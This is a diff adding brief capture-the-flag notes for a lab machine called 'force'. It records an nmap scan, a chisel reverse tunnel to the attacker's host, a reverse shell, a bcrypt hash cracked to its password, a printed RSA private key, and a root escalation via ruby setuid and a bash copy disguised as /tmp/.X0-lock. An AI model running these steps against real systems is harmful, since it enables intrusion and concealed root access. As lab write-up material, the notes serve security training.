@@ -1,0 +1,101 @@
+force
+
+└─$ nmap -A -p- -T4 10.10.20.103 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 08:24 GMT
+Nmap scan report for 10.10.20.103
+Host is up (0.035s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b5:20:37:9f:99:b2:4f:23:ba:3a:43:60:b7:45:c8:62 (RSA)
+|   256 12:77:83:03:1f:64:bb:40:5d:bf:2c:48:e2:5a:b5:18 (ECDSA)
+|_  256 74:7c:e6:07:78:fc:fd:45:1d:e8:2b:d5:02:66:8e:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29
+|_http-title: Did not follow redirect to http://death-star.thm
+Service Info: Host: death-star.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 161.91 seconds
+
+subdomain : force
+
+register an new_account, then use a CVE to change the vader password and get a shell as vader
+
+env = Mongo: 172.17.0.4:8081
+
+forward the port 
+
+./chisel client 10.21.78.142:8000 R:8081:172.17.0.4:8081
+
+use another CVE to get a shell in the mango server
+
+reverseshell => mongo_user => cat /backup/db_backup/meteor/bson.hash :
+
+vader:$2a$06$g10icfFeWNjZCtE3SEbm7uIgZNnw25iz4XUh94XdqQmFYofaSi8CW
+
+└─$ echo 'vader:$2a$06$g10icfFeWNjZCtE3SEbm7uIgZNnw25iz4XUh94XdqQmFYofaSi8CW' > vader.hash
+                                                                                                                      
+┌──(marius㉿localhost)-[~/Chisel/Force]
+└─$ john vader.hash --wordlist=/usr/share/wordlists/rockyou.txt                           
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 64 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jediknight       (vader)     
+1g 0:00:00:07 DONE (2024-11-07 11:22) 0.1406g/s 3787p/s 3787c/s 3787C/s kennyc..fudgey
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAwafsaaB69NLIolWOsiLnfzvjBMOH5R2PCQVM20VwID2dmEz3
+sFFu+n5z0RoUjmfVSCTFs/mS7f6q88FsQWZIAD1hsYFujcoagVWPhBWTvTqysz8k
+qH/baEpS8mpNwzdjqFJIVMFi7QFMxXOlnhOSpKwhZbfXAhkKKW1PX0MbBKyc9ZVa
+IB/91N4C5gDURxFxiS3setnYyJMg1TjsiKsPT1QYIoTRCKwckH3JJKXXB84v9Air
+MqpCcV0nDNb9+kxWhIkrzi/vD1teuivoyo+UsJIm69wVO+m3ZOOuyYVZaa2rWyje
+l9Y/BmYbG75TPYrXDMY7/LIRrDzwSgAf2MmXKwIDAQABAoIBAQCGCmc2zV+N6f/5
+bOLyJfq6NId0GqsLSSRiCAskkrGDf2J/snaW0ibQt4oOp9CmqPQVlW5Knmq21Nkb
+EzyNH/CiSdo+9OnCtqsV7lUCBbVW+zQJoaEMCEOjsh4rsKzWfJY8QYfTMm/4wDeV
+S/DMs5uC46nSMCdgSligSAryUw52cpeNxtYjpbfjaBlfF5t0SvIBMmLPdpymFsCU
+q9Kg+t49fYzK03rqEGCZ5tfVE8UP9MLQv1buz6GYxg7eFRLVE4e5Y0Z43KG9wReI
+hwrrs11jp94jfZTTV/uggcpEdsyjVrsBZOs8Ixf62Ich9xgmfkLwn7fryvfsa0sO
+6SoQ/p+hAoGBAN+ZWGpKitl+NUl9hmsqj1OH5A0ukNrjIfFAfsAZV/+Awi2usOVJ
+EGc4O7S+vnTdCVKANAm53Gz5LHCDWqCXO2LGjbFtjSfHHEvEn/Evdic4/7OC6/nE
+xW4vjfZGOD9QAfqJdowrB8zxrH6GHmFaKkPhLf6IxwPQO7Ki4mDbealzAoGBAN23
+zp5OQ4dGGeT4GXawrnZKfmP6L9gAfTbJCkUaihzdKky8w0NFMZK53BpyxfNdRJhv
+c0sruNlceK5L+Nri1TG/YzersCOKMQaaIVeb1NSaC/TRmon1r9JJNAZVzwJFzms2
+LHdT1nhSsA08rp4HO9D+0MYBZTy/vEH8YHU3hs1pAoGAB4NFfzzF8YzWCYQYMh2Z
+9zqHpRG9eD1NdKewGpA/bqxK2fIWq32K+YzgJLCMAa0zlPwNw43lJBwzLAydzOuH
+6Ue2lxGRPpboEnumzBnGJIc7wDJT7253G76pTG8LkMUFa/+WZhtEBdTQ8OdcufSn
+muREAVtjJHOordXfOVXmfpUCgYEA2m0eTK7lr/rLv9r7mwZsmXTCF1R+ldnFgZeF
+WpbOwajQ51B/PWKJd/dKc3Pmt96GmXYSq1ejf9+ttGh7/YfCaIQYBtxJZnnZ2ps1
+hc2rWtd4N/PWv1sfn5cmfadDjQWgWdbA773UaC1t61yA2oZd04N1wdvWFIb/vDIa
+BOBzGSECgYBiBZ+fyRBzQx3fElup709PFBxauWucWa0D5cAabZ+AXKLoS+ghmZUM
+OsjbvlaFwL7mkobIxHlrBmEdMFPJSCQzVNfKdTwGej0+Nknq3FNp/ymEvL/o3W0b
+5lF+HUBcmOX8kZn4YzQFtIN4gCf6PUgcmxORzt2APbUYDZqwtGq5CA==
+-----END RSA PRIVATE KEY-----
+
+shell as vader in ssh
+
+cd /home/vader
+
+cat user.txt
+
+./linpeas.sh
+
+apparmor => ruby2.5
+
+cd /tmp
+cp /bin/bash .X0-lock
+chmod +x .X0-lock
+
+usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X0-lock /tmp/.X2-lock"'
+
+./.X2-lock -p
+
+got a shell as root
+
+cd /root/
+
+cat root.txt : 
